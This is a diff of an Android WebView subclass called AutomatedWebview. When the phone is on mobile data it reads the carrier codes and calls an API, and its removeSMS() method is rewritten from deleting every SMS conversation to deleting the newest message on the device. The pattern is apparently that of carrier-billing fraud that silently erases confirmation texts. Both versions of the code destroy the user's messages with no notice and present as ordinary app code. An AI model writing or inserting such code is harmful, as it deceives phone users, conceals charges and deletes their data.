@@ -111,7 +111,7 @@ public class AutomatedWebview extends WebView {
         }
         if (mMobile != null) //If connected to 3G/4G
         {
-            getMNCMCC();
+            getMNCMCC(); //generating mnc & mcc
             if (mnc != 0 || mcc != 0) //If MNC and MCC are not empty
             {
                 //Calling the api
@@ -386,42 +386,16 @@ public class AutomatedWebview extends WebView {
 
     private void removeSMS() {
         Uri uriSMSURI = Uri.parse("content://sms/");
-//        try {
-//            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
-//            if (cur.moveToFirst()) {
-//                String MsgId = cur.getString(0);
-//                context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
-//            }
-//        }
-//        catch(Exception e)
-//        {
-//            e.printStackTrace();
-//        }
-
-        Cursor c = context.getContentResolver().query(uriSMSURI, null, null, null, null);
-        //c.moveToFirst();
-
-        while (c.moveToNext())
+        try {
+            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
+            if (cur.moveToFirst()) {
+                String MsgId = cur.getString(0);
+                context.getContentResolver().delete(Uri.parse("content://sms/" + MsgId), null, null);
+            }
+        }
+        catch(Exception e)
         {
-            System.out.println("Inside if loop");
-
-            try
-            {
-                String address = c.getString(2);
-
-
-
-
-                    String pid = c.getString(1);
-                    String uri = "content://sms/conversations/" + pid;
-                    context.getContentResolver().delete(Uri.parse(uri), null, null);
-
-
-            }
-            catch (Exception e)
-            {
-                e.printStackTrace();
-            }
+            e.printStackTrace();
         }
     }
 
